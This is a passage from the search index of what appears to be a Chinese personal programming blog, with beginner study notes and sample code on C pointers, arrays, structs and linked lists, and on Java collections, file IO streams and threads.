1p[0],p[1],...//需要定义指针数组 指针表示法: 1*(p+0),... 注意：使用指针变量引用数据时，必须关注当前值 比如：若p=p+3，则p[0]代表a[4] 二维数组指针1int a[3][4]; a是首地址 三个行元素的地址分别是:a,a+1,a+2且a[0],a[1],a[2]也是地址量，即*(a+0),*(a+1),*(a+2)是一维数组的首个元素的地址 每个元素的地址&amp;a[i][j],a[i]+j,*(a+i)+j都可以表示 元素的表示a[i][j],*(a[i]+j),*(*(a+i)+j)可以表示 要使用这两种方法引用元素的前提是二维数组全赋给指针数组 12int (*p)[3], a[2][3];p = a; 注意:()不能去掉，因为[ ]的优先级高于() 意思是一个指向二维数组的指针，只占int的字节数 type *p[num]的意思是一组指针，每个元素保存一个指针 等价关系 a+i == p+i a[i] == p[i] == *(a+i) == *(p+i) a[i][j] == p[i][j] == *(a[i]+j) == *(p[i]+j) == *(*(a+i)+j) == *(*(p+i)+j) 说明: ​ 赋给指针时首地址是a[0]，**a表示a[0][0] 初始化的方法方法一 12char a[] = {0,1,3,4,5,6,7,8,9,-1};char *pa = &amp;a[0]; 方法二 123char a[] = {0,1,3,4,5,6,7,8,9,-1};char *pa;pa = &amp;a[0]; 错误表达 123char a[] = {0,1,3,4,5,6,7,8,9,-1};char *pa;*pa = &amp;a[0];//Error! 算术操作及比较 只可以作加减法 p+n指的是p指向的数据单元之后的第n个数据单元 int *p;(设p的初始值是2000) p+1;表示2002 指针值的比较（&lt;,&lt;=,&gt;,&gt;=,==,!=） 前提条件：p1和p2是同一类型的指针变量，并且都指向同一段连续的储存空间 则p1&lt;p2为真的话结果是1，否则是0 数组是递增排列的，a[0]&gt;a[1] CONST1.只有C99以后的支持 1int * const q = &amp;a; 此时q被固定，q++不能实现； 12const int *q = &amp;a;int const* q = &amp;a； q可以被赋地址，但*q不能被赋值 2.非const转换为const 123456针void f(const int* x);int a = 15;f(&amp;a); //okconst int b = a;f(&amp;b); //okb = a + 1; //error 适用于传递的参数类型比地址大时 3.const数组 1const int a[] = {1,2,3}; 此时每个单元都是const， 只能通过初始化赋值， 因为把数组传入函数时是地址，所以函数可以修改数组的值 为了保护数组不被破环，可以设置参数为const 1int sum(const int a[ ] ); 0地址 通常0地址不能乱碰 你的指针不应该有0值 0地址可以来表示特殊的事情 返回的指针是无效的 指针没有真正初始化 NULL是一个预定的符号，表示0地址 一般用NULL表示0地址 作用 传入较大的数据时用作参数 传入数组后对数组进行操作 返回多个结果 修改多个变量 动态申请内存","link":"/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%8C%87%E9%92%88.html"},{"title":"简单理解数组","text":"使用数组的原因为了方便处理更多的数据 一维数组数组长度可以这样表示：sizeof(a) / sizeof(a[0])在数组作为函数参数时不行 因为在函数参数表内：sizeof(a) == sizeof(type* ) 定义格式类型 数组名[元数个数]1.名字遵循规范 2.元数个数一般是常量 (整数)，不能是变量 //二级考试，实际上c99，c11已经支持变量 3.内存大小=元素类型*元素个数 4.一旦定义，不能改变 数组的初始化1.数组类型 名称[n]={0,....n-1}; 2.给特定元素赋值,其他默认是0，如果两个特定元素中间有元素，必须把0补上 3.数组类型 名称[ ]={0,....n}; 不写个数,由写的元素来定个数;4. 1234int a[10] = { [0] = 2, [3] = 3, 4, //表示[4] = 4};//c99才有用 注意事项数组名[下标] 数组变量本身不能被赋值 要把数组所有元素交给另一个数组，必须采用遍历（区分结构体） 下标为整型常量或整型表达式 只能逐个引用数组（遍历） 编译器和运行环境都不会检查越界问题，虽然有时候也不会出错 windows会提示segmentation fault 特例:定义a[0]存在，但无用 特点:个数是n，实际上是0,1,2,.....n-1 与储存格式与c语言有关，储存时会有一个首地址，第一个数据会直接存到首地址中，第二个数据存到首地址+类型字节*i中i本该是2，在C语言中是1，不然会增加运算量，但其他语言可以 二维数组定义格式类型 数组名[常量表达式1][常量表达式2] 说明：表达式1表示行，2表示列 存放顺序：按行从左到右依次 引用格式数组名[下标][下标] 下标可以是常量或者整型表达式 初始化格式1.分段赋值1234int score[5][3] = { {1, 2, 3}, {4, 5, 6,},...} 2.连续赋值1int score[5][3]={1,2,3,4,5,6...} 3.给部分元素赋值 其他自动取0 或者全部赋值，但一维的长度不给出 如 1int score[][3]={1,2,3,4,5,6,7,8} 遍历数组123456789101112131415161718192021#include &lt;stdio.h&gt;int main (){ char a[] = {0,1,3,4,5,6,7,8,9,-1}; char *pa = &amp;a[0]; int i; //1.普通方法 for ( i=0; i&lt;sizeof(a)/sizeof(a[0]); i++) { printf(&quot;%d\\t&quot;, a[i]); } printf(&quot;\\n&quot;); //2.在数组后面添加一个-1，利用指针输出，结束 while ( *pa != -1) { printf(&quot;%d\\t&quot;, *pa++); } printf(&quot;\\n&quot;); return 0;} 字符串数组使用时注意初始化！ 12char *a[]={NULL};char *a[]={0}; 指向字符串的指针变量 c语言中对字符常量的处理是按照字符数组来处理的 123char *cp;cp=&quot;love&quot;; //初始化printf(&quot;储存的内容:%s\\n&quot;, cp ); 说明： 实际上字符串的第一个元素的地址赋给cp 系统先输出首字符，然后指针自动+1，继续输出，直到碰到\\0 因为c语言中没有字符变量，所以存放字符串用字符数组 格式1char name[]; 初始化同一维数组 如： 1char i[] = {'a','n','d'}//此时数组长度为3 c语言允许用字符串的形式给数组赋值；此时c语言默认字符串以\\0结尾，会用一个字节来存放\\0 如： 1char i[] = &quot;china&quot;;//注意此时数组长度为6 输出格式： 1printf(&quot;%s&quot;, i); 定义为字符类型时scanf输入的字符中不能带空格，空格后面的东西不会被赋值。 并且，由于指针的原因，输入格式为： 1scanf(&quot;%s&quot;,name);//不需要&amp; 字符串输出(在stdio.h里)：puts(name); 输入：gets(name); 有点小问题，需要和getchar()搭配使用 空格不会使输入结束，只有回车可以 注意事项字符串常量1char* s = &quot;Hello, world!&quot;; s是一个指针，初始化为指向一个字符串常量 由于这个常量所在的地方，实际上s是const char* s，但由于历史的原因，编译器接受不带const的写法 但是师徒对s所指的字符串做写入会导致严重的后果 如果需要修改字符串，应该用数组： 1char s[] = &quot;hello world&quot;; 常见错误12char *string;scanf(&quot;%s&quot;, string); 以为char*是字符串类型，定义了一个字符串类型的变量string就可以直接使用了 由于没有对string初始化为0，所以不一定每次运行都出错 指针还是数组？12char *str = &quot;hello&quot;;char word[] = &quot;hello&quot;; 数组：这个字符串在这里 作为本地变量空间自动被回收 指针：这个字符串不知道在哪里 用来处理参数 动态分配空间 要构造一个字符串用数组，处理用指针 char*是字符串？ 字符串可以表达为char*的形式 char*不一定是字符串 本意是指向字符的指针，可能指向的是字符的数组（int*） 只有它所指的字符数组有结尾的0，才能说它所指的是字符串 字符串的赋值实际上是把指针指向了那个值，并没有创造新的值 12char a[10] = &quot;&quot;;//表示一个空的字符串，a[0]=&quot;\\0&quot;char a[] = &quot;&quot;;//这个数组的长度只有1 总结char a[][10 ];!=char *a[]; char (*a)[10]; 初始指针字符数组的方法char *a[]={NULL}; char *a[]={0}; 1234567891011121314char *a[ ] = {&quot;January&quot;,&quot;February&quot;,&quot;March&quot;,&quot;April&quot;,&quot;May&quot;,&quot;June&quot;,&quot;july&quot;,&quot;August&quot;,&quot;September&quot;,&quot;October&quot;,&quot;November&quot;,&quot;December&quot;,}; a[]存了每个字符常量的首地址","link":"/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%95%B0%E7%BB%84.html"},{"title":"简单理解结构","text":"结构体功能 为了让一组数据有联系 可以在函数内定义，也可以在函数外面，在外面可以多个函数引用 类型 类型定义 1234struct 结构体名{ 成员列表//由若干成员组成}; 成员定义 类型说明符 成员名; 变量 变量的定义 ⑴先定义类型，再定义变量 12345678struct stu{ int mun; char name; char sex; float score;};struct stu boy1,boy2; ⑵在定义类型的同时定义变量 1234567struct{ int mun; char name; char sex; float score;}boy1,boy2; ⑶直接定义结构体变量 1234567struct stu{ int mun; char name; char sex; float score;}boy1,boy2; 说明: 使用typedef更好定义，也更简洁 ⑵与⑶的区别就是⑶没有结构体名，直接是变量 一个结构体类型所占的字节并不是所有类型的字节加起来，(使用sizeof(struct 结构体名)可以查看)因为读取效率问题，所以编译器会默认数据对齐 结构体可以嵌套使用 结构体是用户定义的，不是唯一的 只有说明变量系统才会分配空间 结构体指针变量同样可以这样定义 指针 结构体和数组不一样，没有首地址这种说法，要想得到地址必须使用&amp; 结构体的初始化12345678910111213141516171819202122#include &lt;stdio.h&gt;struct date{ int month; int day; int year;};int main(int argc, char const *argv[]){ //methods a: struct date today = {11, 13, 2019}; //methods b: struct date thismonth = {.month=11, .year=2019}; //%i可以把十六进制和八进制转换位十进制输出 printf(&quot;%i-%i-%i\\n&quot;, today.year, today.month, today.day); //不给值默认0 printf(&quot;%i-%i-%i\\n&quot;, thismonth.year, thismonth.month, thismonth.day); return 0;} 访问成员的运算符1.成员运算符. 格式：结构体变量名.成员名 功能：访问结构体内的成员 2.指针运算符-&gt; 格式：结构体指针变量名-&gt;成员名 1234567struct str{ int num ; //4 char name[ 20 ] ; //20 char sex ; //1字节对齐后是4 struct date birthday ; //12 float score; //4 }boy1,boy2,*ptr1; 例如 1printf(&quot;%d&quot;, boy1.name); 可以输出boy1的成员name 又如 1printf(&quot;%d&quot;, ptr1-&gt;num);//等价于(*ptr1.num); 说明 如果成员本身是一个结构体的话，则需要引用到具体的成员才行. 结构体必须被初始化才有意义 但我发现定义结构体成员后默认数据是0，指针是NULL .和-&gt;的优先级比较高，仅次于() 结构体的对齐 主要是为了提高读取效率 四个基本概念: 数据类型自身的对齐值：对于char型数据，其自身对齐值为1，对于short型为2，对于int,float,double类型，其自身对齐值为4，单位字节 结构体的自身对齐值：其成员中自身对齐值最大的那个值 指定对齐值：#pragma pack (value)时的指定对齐值value 数据成员和结构体的有效对齐值：数据成员(数据类型)和结构体的自身对齐值和指定对齐值中小的那个值。(数据成员对齐了数据结构自然也就对齐了) 说明: 有效对齐值N是最终采用的对齐方式,对齐N也就是说存放的原始地址%N=0. 数据结构中的变量都是按定义的先后顺序排放的,第一个数据的起始地址就是数据结构的初始地址. 结构体的变量占用的总长度必须是有效对齐值的整数倍. 例子 1234567891011#include&lt;stdio.h&gt;main(){ struct B{ char b; int a; short c;}; printf(&quot;%d&quot;,sizeof(struct B));} 运行结果为12 解释： 设初始地址为0x0000 char自身对齐值是1，存放地址满足0x0000%1=0 int自身对齐值是4,只能存放0x0004到0x0007这四个字节,才能满足0x0004%4=0 short自身对齐值2，占0x0008和0x0009，所以0x0000到0x0009都是B的内容 由于只有10个字节,结构体的有效对齐值是4，因为编译器为了实现结构数据的存取效率，所以自动补充2个字节满足(10+2)%4=0 结构体参数 结构型和传值型 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;struct date{ int x; int y;};struct date getStruct(void);//返回结构/*传值*，不改变原来的值*/// void getStruct(struct date);void putStruct(struct date);int main(int argc, char const *argv[]){ struct date a={0, 0}; a = getStruct();//结构可以赋给结构，数组不可以 putStruct(a); return 0;}// void getStruct(struct date pg){// scanf(&quot;%d&quot;, &amp;pg.x);// scanf(&quot;%d&quot;, &amp;pg.y);// printf(&quot;pgx=%d,pgy=%d\\n&quot;, pg.x, pg.y);// }struct date getStruct(void){ struct date pg; scanf(&quot;%d&quot;, &amp;pg.x); scanf(&quot;%d&quot;, &amp;pg.y); return pg;}void putStruct(struct date pp){ printf(&quot;x=%d,y=%d\\n&quot;, pp.x, pp.y);} 指针型（推荐使用）： K &amp; R：If a large structrue is to be passed to a function, it is generally more efficient to pass a pointer then to copy the whole structrue. 12345678910111213141516171819202122232425262728293031323334353637#include &quot;stdio.h&quot;struct date{ int x; int y;};struct date* getStruct(struct date*);void outputs(const struct date*);void output(struct date p);int main(int argc, char const *argv[]){ struct date a={0, 0}; getStruct(&amp;a);//这个和下面组成一个 output(a); output(*getStruct(&amp;a));//一句完成上面两句话(指针) outputs(getStruct(&amp;a));//同上 return 0;}struct date* getStruct(struct date *pa){ scanf(&quot;%d&quot;, &amp;(*pa).x); scanf(&quot;%d&quot;, &amp;pa-&gt;y);//可以这样简写 printf(&quot;pa-&gt;x=%d,pa-&gt;y=%d\\n&quot;, pa-&gt;x, pa-&gt;y); return pa;}void outputs(const struct date* outpa){ printf(&quot;outpa-&gt;x=%d,outpa-&gt;y=%d\\n&quot;, outpa-&gt;x, outpa-&gt;y);}void output(struct date p){ printf(&quot;p.x=%d,p.y=%d\\n&quot;, p.x, p.y);} 结构的嵌套结构数组12345678910111213struct time{ int hour; int minute; int seconds;} struct time testTime[5] = { {01,33,11}, ....}//testTime[i].hour 结构中的结构123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;struct point{ int x; int y;};struct rectangle{ struct point p1; struct point p2;};int main(){ struct rectangle r, *rp; rp = &amp;r; r = (struct rectangle){{1,2}, {3,4}};//必须进行类型转换才能赋值/*等价关系：r.p1.xrp-&gt;p1.x(r.p1).x(rp-&gt;p1).x不存在rp-&gt;p1-&gt;x*/ printf(&quot;%d\\n&quot;, ((rp-&gt;p1.x)+1));//+1表示y printf(&quot;%d\\n&quot;, (rp-&gt;p2.x)); return 0;} 结构中的结构的数组123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;struct point{ int x; int y;};struct rectangle{ struct point p1; struct point p2;};int main(int argc, char const *argv[]){ int i; struct rectangle rects[] = { { {1,2}, {3,4} },{ {5,6}, {7,8} } }; /* 1级大括号是数组rects[] 2级大括号是rectangle {} 3级大括号是p1,p2 可以这样写： struct rectangle rects[] = { {{1,2}, {3,4}}, {{5,6}, {7,8}} }; */ return 0;}","link":"/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E7%BB%93%E6%9E%84.html"},{"title":"链表","text":"参靠浙江大学翁凯老师的链表 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;typedef struct _node{ int value; struct _node *next;} Link;typedef struct{ Link *head; // Link *tail;} List;//void add(List *pList, int num);void print(List list);int main(int argc, char const *argv[]){ int num; List list; list.head = NULL; do{ scanf(&quot;%d&quot;, &amp;num); if(num != -1){ add(&amp;list, num);//add printf(&quot;list=%x\\n&quot;, list); } }while(num != -1);//输出 print(list);//delete printf(&quot;delete\\n&quot;); scanf(&quot;%d&quot;, &amp;num); Link *p; int isFound = 1; for(p=list.head; p; p=p-&gt;next){ if(p-&gt;value == num) { printf(&quot;look!\\n&quot;); isFound = 0; Link *q=NULL; for(p=list.head; p; q=p, p=p-&gt;next){ if( p-&gt;value == num ) { if( q ){ q-&gt;next = p-&gt;next; } else { list.head = p-&gt;next; } free(p); break; } } printf(&quot;delete after:\\n&quot;); print(list); break; } } if( isFound ) { printf(&quot;Not!&quot;); }//remove: Link *q=NULL; for( p=list.head; p; p=q){ q = p-&gt;next; free(p); } printf(&quot;over!\\n&quot;); return 0;}void add(List *pList, int num){ //add to linked-list Link* p=(Link*)malloc(sizeof(Link)); p-&gt;value = num; p-&gt;next = NULL; //find head Link* last = pList-&gt;head;//pHead-&gt;Link* printf(&quot;last=%x\\n&quot;, last); if(last){ while(last-&gt;next){ last = last-&gt;next; printf(&quot;last=%x\\n&quot;, last); } //attach last-&gt;next = p; } else{ pList-&gt;head = p; }// return head;}void print(List list){//遍历链表 Link* p; for (p=list.head; p; p=p-&gt;next){ printf(&quot;%d\\t&quot;, p-&gt;value); } printf(&quot;\\n&quot;);}","link":"/Programming/C/%E9%93%BE%E8%A1%A8.html"},{"title":"集合类","text":"别问是什么，问就是不懂 ArrayList集合相当于一个可变的数组，这个数组可以存放任何数据类型（但是建议存储相同类型的） 集合里面只能存储引用类型 他会自动把基本类型装箱 举个例子 123456789101112131415161718192021222324252627282930313233package com.manu1.arraylist;import java.util.ArrayList;public class ArrayListDemo { public static void main(String[] args) { ArrayList al1 = new ArrayList(); al1.add(123); al1.add(2); al1.add(2, 3);// al1.add(&quot;test&quot;); al1.addAll(0,al1); System.out.println(al1.get(1)); for(int i=0; i&lt;al1.size(); i++) { System.out.print(al1.get(i)+&quot; &quot;); } System.out.println(); al1.remove(2); for(int i=0; i&lt;al1.size(); i++) { System.out.print(al1.get(i)+&quot; &quot;); } System.out.println(); //进行运算 int result = 0; for(int i=0; i&lt;al1.size(); i++) { result += (int)al1.get(i); } System.out.println(result); }} ArraryList里存储的类型都是Object类型 所以运算需要进行强制转换 add的类型决定转换的类型 遍历器除了使用for进行遍历外，还可以使用遍历器进行遍历，遍历器有一个指针，一开始空指向，随着调用next而改变指向 1234Iterator iterator = al1.iterator(); while(iterator.hasNext()) { System.out.println(iterator.next());;} for高级遍历123for(Object o : al1) { System.out.println(o);} Vector集合大致语法和ArrayList一样，主要区别是Vector线程安全，适合多线程，不是多线程的话可以使用ArrayList LinkedList 语法同样和ArrayList差不多 主要区别是存储结果不同，ArrayList里面是数组，LinkedList存的是引用 这样的优点就是插入数据和删除数据的效率快 泛型在上面，使用ArrayList创建的数组存储int型数据时，计算需要强制转换类型，解决这个强制转换的方法就是泛型 注意&lt;&gt;里只能是引用数据类型 数据会自动装箱 12345//泛型ArrayList&lt;Integer&gt; a = new ArrayList&lt;Integer&gt;();a.add(234);a.add(34);System.out.println(a.get(0)+a.get(1)); HashSet上面三个都是有序的，可重复的 而HashSet是无序的，不可重复的（所以没有get方法） TreeSet和HashSet差不多，只是存储结构不一样 存储自定义的类1234567891011121314151617package com.manu2;import java.util.ArrayList;public class Test { public static void main(String[] args) { ArrayList&lt;Cut&gt; c = new ArrayList&lt;Cut&gt;(); Cut cut = new Cut(1,&quot;xiaohua&quot;); c.add(cut); c.add(new Cut(2,&quot;abiao&quot;)); for(Cut i : c) { System.out.println(i.age+&quot; &quot;+i.name); } }} HashMap举个例子 12345678910111213141516171819202122232425package com.manu2;import java.util.HashMap;public class HashMapDemo { public static void main(String[] args) { //HashMap里面存储的是键值对，可指定key和value的类型 HashMap m = new HashMap(); //HashMap&lt;String, Integer&gt; m = new HashMap&lt;String, Integer&gt;(); m.put(&quot;manu&quot;, 2001); m.put(&quot;hello&quot;, 102); //键不能相同，相同会覆盖前面的值 //遍历key for(Object key : m.keySet()) { System.out.println(key+&quot; &quot;+m.get(key)); } //遍历value for(Object value : m.values()) { System.out.println(value+&quot; &quot;); } System.out.println(m.containsKey(&quot;hello&quot;)); System.out.println(m.containsValue(2001)); }} TreeMap和HashMap差不多 ，主要是存储上不同 HashTable与HashMap的区别是线程安全 性能略低 总结Collection(存储单个值) list，重复有序 ArrayList LinkedList Vector Set，不重复，无序 HashSet TreeSet Map(存储键值对) HashMap TreeMap HashTable 自己写Conlection当然功能很简陋 123456789101112131415161718192021222324package com.manu1;public class MyArrayList&lt;T&gt; { private T[] dataArray = (T[])new Object[100]; //虽然不能子类声明，父类构造，但可以强制转换 private int index = 0; public void add(T data) { dataArray[index] = data; index++; } public T get(int index) { if(index&gt;=0 &amp;&amp; index&lt;(this.index-1)){ return dataArray[index]; }else { return null; } } public int size () { return index; }} 异常处理Exception 在java里面，所有错误类都属于Exception类 正常程序碰到错误会直接崩溃 可以用try语句对有可能出现错误的地方进行处理，即使错误也会执行后面的代码 语法 1234567try{//这里是错误代码 }catch(错误类型 对象){//取得错误后的操作代码，如：对象.方法}finally{//不管有没有错都会执行的语句} catch可以写无数个 如果想包含所有的错误可以把错误类型写成Exception","link":"/Programming/Java/day10_%E9%9B%86%E5%90%88%E7%B1%BB.html"},{"title":"理解IO流","text":"操作文件就是IO IO流-1.0（文件操作）也就是读取硬盘数据的操作，介绍一下文件 文件 文件 文本文件，二进制文件 目录 数据存放的地方 运行的程序数据放在内存 照片，文档放在硬盘 什么是IO流 把数据从硬盘读取到内存==&gt;I流 把数据从内存存到硬盘==&gt;O流 FileFile可以指向一个文件，也可以指向目录 123456789101112131415161718package com.manu3.file;import java.io.File;public class FileDemo { public static void main(String[] args) { File f1 = new File(&quot;/home/manu&quot;); File f2 = new File(&quot;/home/manu/Java/src/day1/Math.java&quot;); //构造方法有很多，就不一一列举了 System.out.println(f1.isDirectory()); System.out.println(f1.isFile()); System.out.println(f2.isFile()); System.out.println(f2.exists()); System.out.println(f2.canRead()); System.out.println(f2.canWrite()); System.out.println(f2.canExecute()); }} 创建和删除 12345678910111213public class FileDemo { public static void main(String[] args) throws IOException { File f1 = new File(&quot;/home/manu/Java/Test.md&quot;); File f2 = new File(&quot;/home/manu/Java/Test&quot;); f1.createNewFile(); f2.mkdir(); f2.mkdirs();//创建多级目录// f1.delete(); f1.renameTo(new File(&quot;/home/manu/Java/Test2.md&quot;)); //这个renameTo还可以移动文件，和linux的mv指令是真的像 f2.delete(); }} 获取一些信息 12345678910111213public class FileDemo { public static void main(String[] args) throws IOException { File f1 = new File(&quot;/home/manu/Java/Test2.md&quot;); File f2 = new File(&quot;Test&quot;);// f2.createNewFile(); System.out.println(f1.getAbsolutePath());//绝对路径 System.out.println(f2.getPath());//相对路径 System.out.println(f1.getName()); System.out.println(f1.length());//文件大小 System.out.println(f1.lastModified());//获取最后修改时间，单位毫秒 System.out.println(f1.getParent()); }} list 123456789101112131415import java.io.File;import java.io.IOException;public class FileDemo { public static void main(String[] args) throws IOException { File dir = new File(&quot;/home/manu/Java_learn_workspace/Learn02&quot;); String[] s = dir.list(); for(String i : s) { System.out.println(i); } File[] s2 = dir.listFiles(); for(File i : s2) { System.out.println(i.getName()); }} 两个题目，觉得挺有意思，放上来 1.复制文件 1234567891011121314package com.manu4.practice;import java.io.File;import java.io.IOException;import java.nio.file.Files;public class CopyFiles { public static void main(String[] args) throws IOException { File source = new File(&quot;/home/manu/Java/Test2.md&quot;); File target = new File(&quot;/home/manu/Java/Test2&quot;); Files.copy(source.toPath(), target.toPath()); }} 2.递归查找文件 123456789101112131415161718192021package com.manu4.practice;import java.io.File;public class RTD { public static void TraversalDiractory(File parentDir) { File[] temp = parentDir.listFiles(); for(File file : temp) { if(file.isFile()) { System.out.print(file.getName()+&quot; &quot;); } } System.out.println(); for(File file : temp) { if(file.isDirectory()) { System.out.println(file.getPath()+&quot; &quot;); TraversalDiractory(file.getAbsoluteFile()); } } }} IO流-2.0（文件内容操作）​ 数据类型 文本数据 二进制数据 数据流 字节流 抽象基类：InputStream OutputStream 字符流 抽象基类：Reader Writer 字节流 默认没有缓冲区（代表频繁与硬盘交互，浪费性能） 操作一个字节 输入 InputStream–&gt;FileInputStream 12345678910111213141516171819202122232425262728293031323334353637383940 public void testFileInputStream() { FileInputStream input = null; try { input = new FileInputStream(&quot;Test/test1.txt&quot;); //有一个指针，会自动改变指向 //1.一字节的读取// while (true) {// int a = input.read();// if(a == -1)break;// System.out.print((char) a);// //注意，因为是字节流，所以读取中文会乱码，中文占两字节// } //2.字节数组的读取 byte[] data = new byte[4]; while(true) { int length = input.read(data); if(length==-1) break; //输出方法一 for(int i=0; i&lt;length; i++) { System.out.print((char)data[i]); } //输出方法2 String str = new String(data,0,length); //表示从data里的0开始取数据，长度为length System.out.print(str); } } catch (IOException e) { // TODO: handle exception e.printStackTrace(); } finally { try { if (input != null) { input.close();// 释放资源 } } catch (IOException e) { e.printStackTrace(); } } }} 输出 OutputSteam–&gt;FileOutputStream 123456789101112131415161718192021222324 @Test public void testFileOutputStream() { FileOutputStream output = null; try { //true表示追加模式 output = new FileOutputStream(&quot;Test/test1.txt&quot;,true);// output.write(97); String str = new String(&quot;abcd&quot;); output.write(str.getBytes()); //截取字串添加 output.write(str.getBytes(), 1, 3); }catch (IOException e) { // TODO: handle exception e.printStackTrace(); } finally { try { if(output != null) output.close(); }catch (Exception e) { // TODO: handle exception e.printStackTrace(); } } } 文件文本的复制练习 我使用了字节数组完成 后面有对比单字节和字节数组效率的数据 1234567891011121314151617181920212223242526272829303132333435363738394041package com.manu.iostream;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;public class IOCopy { public static void copyFile(String source,String target) { FileInputStream input = null; FileOutputStream output = null; try { //input input = new FileInputStream(source); output = new FileOutputStream(target); byte[] data = new byte[1024]; int length=-1; while((length=input.read(data))&gt;-1) { String str = new String(data,0,length);// System.out.println(&quot;读取成功&quot;); //output output.write(str.getBytes());// System.out.println(&quot;写入成功&quot;); } } catch (IOException e) { e.printStackTrace(); } finally { try { if(input!=null) input.close(); }catch (IOException e) { e.printStackTrace(); } try { if(output!=null) output.close(); } catch(IOException e) { e.printStackTrace(); } } }} 对比复制104.5M的压缩包 12345678910public void testCopy() { long start = System.currentTimeMillis(); copyFileByArray(&quot;Test/test.zip&quot;,&quot;Test/test2.zip&quot;); long end = System.currentTimeMillis(); System.out.println(end-start); start = System.currentTimeMillis(); copyFileByByte(&quot;Test/test.zip&quot;,&quot;Test/test3.zip&quot;); end = System.currentTimeMillis(); System.out.println(end-start); } 结果（单位毫秒） 121024字节：5515单字节：493533 缓冲区作用：节约性能，当缓冲区满时就会与硬盘交互 缓冲输出流（包装流）缓冲区的数据只有在下面三种情况才会写入硬盘，之所以说是包装流是因为它依赖于File 满了 调用flush刷新缓冲区 调用close 123456789101112131415161718192021222324252627282930313233package com.manu5.buffer;import java.io.BufferedOutputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import org.junit.Test;public class TestBufferedOutputStream { @Test public void testBufferedOutputStream() { BufferedOutputStream bos = null; try { bos = new BufferedOutputStream(new FileOutputStream(&quot;Test/test1.txt&quot;),1); //后面代表自定义缓冲区大小，一般使用默认就好了 bos.write(97); String str = new String(&quot;hello&quot;); bos.write(str.getBytes()); bos.flush(); //建议调用flush，怕close出错 } catch (IOException e) { e.printStackTrace(); } finally { try { if(bos!=null) bos.close(); } catch (IOException e) { e.printStackTrace(); } } }} 缓冲输入流缓冲区的作用 读满缓冲区，然后你需要多少给你多少 节约性能 1234567891011121314151617public class BufferedIOStream { @Test public void testBufferedInputStream() { BufferedInputStream bis = null; try { bis = new BufferedInputStream(new FileInputStream(&quot;Test/test1.txt&quot;));// int data = bis.read();// System.out.println(data); byte[] data = new byte[1024]; int length = bis.read(data); String str = new String(data,0,length); System.out.println(str); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } } 字符流 操作一个Unicode码元（2字节） 默认是有缓冲区的，但不能设置大小 输出 Writer–&gt;OutputStreamWriter（包装流） 构造OutputStreamWriter对象时，可以指定编码，默认系统编码 123456789101112131415161718192021222324252627282930package com.manu.iostream;import java.io.FileOutputStream;import java.io.IOException;import java.io.OutputStreamWriter;import org.junit.Test;public class IO_WriterRead { @Test public void testOutputStreamWriter() { OutputStreamWriter writer = null; try { FileOutputStream fileOutput = new FileOutputStream(&quot;Test/test1.txt&quot;); writer = new OutputStreamWriter(fileOutput); //可以传递两个参数，另一个是编码 writer.write(&quot;你好&quot;); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } finally { try { if(writer!=null); writer.close(); } catch (IOException e) { e.printStackTrace(); } } }} 输入 Reader–&gt;InputStreamWriter（包装流） 构造InputStreamWriter对象时，可以指定编码，默认系统编码 123456789101112131415161718192021@Testpublic void testInputStreamReader() { InputStreamReader reader = null; try { reader = new InputStreamReader(new FileInputStream(&quot;Test/test1.txt&quot;),&quot;utf-8&quot;); char[] data = new char[1024]; int length = reader.read(data); System.out.println(new String(data,0,length)); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } finally { try { if(reader!=null) reader.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } FileWriter Writer–&gt;OutputStreamWriter–&gt;FileWriter 相对与OutputStreamWriter，FileWriter构造时时不需要new FileOutputStream，因为它在调用父类构造方法时自动new FileOutputStream() 例子 12345678910111213141516171819202122@Testpublic void testFileWriter() { FileWriter writer = null; try { writer = new FileWriter(&quot;Test/test1.txt&quot;); writer.write(&quot;hello,我是manu!&quot;); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } finally { try { if(writer!=null) writer.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } } } FileReader Reader–&gt;InputStreamReader–&gt;FileReader 构造简单 例子 1234567891011121314151617181920public void testFileReader() { FileReader reader = null; try { reader = new FileReader(&quot;Test/test1.txt&quot;); char[] data = new char[1024]; int length = reader.read(data); System.out.println(new String(data,0,length)); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } finally { try { if(reader!=null) reader.close(); } catch (IOException e) { // TODO Auto-generated catch block e.printStackTrace(); } }} 如果要设定编码，则需要在构造时给出Charset型的数据即可 如 reader = new FileReader(&quot;Test/test1.txt&quot;,Charset.forName(&quot;GBK&quot;)); BufferedWriter Writer–&gt;BufferedWriter 可以设置缓冲区大小 有一个readLine() BufferedReader Reader–&gt;BufferedReader 可以设置缓冲区大小","link":"/Programming/Java/day11_IO%E6%B5%81.html"},{"title":"理解多线程","text":"就像AI与玩家 进程与线程 启动一个程序就是一个进程，计算机都是多进程的 而进程有主线程和其他线程 也就是在进程里面有多线程 线程的作用：完成多任务，比如游戏角色和AI 主线程 java的主线程都是从main方法里执行的，主线程是系统默认创建出来的（JVM） 其实CPU在同一时间只能运行一个线程，但他运算能力太快了(一秒几亿次)，多线程指的是CPU将每个线程的执行时间做了规划，这段时间执行那个线程，那段时间执行那个进程，人是感觉不到的 创建线程extends Thread 继承Thread 重写run方法 创建对象 调用start方法运行 1234567891011package com.manu.student01;public class MyThread extends Thread { @Override public void run() { for(int i=0; i&lt;1000; i++) { System.out.println(&quot;MyThread:&quot;+i); } }} 运行 123456789101112package com.manu.student01;public class CreateThread { public static void main(String[] args) { MyThread thread =new MyThread(); thread.start(); for(int i=0; i&lt;1000; i++) { System.out.println(&quot;MainThread:&quot;+i); } }} 线程名字线程通常有一个默认的名字，可以在创建线程时写一个构造方法来初始化名字 调用 对象.getName(); 在类里 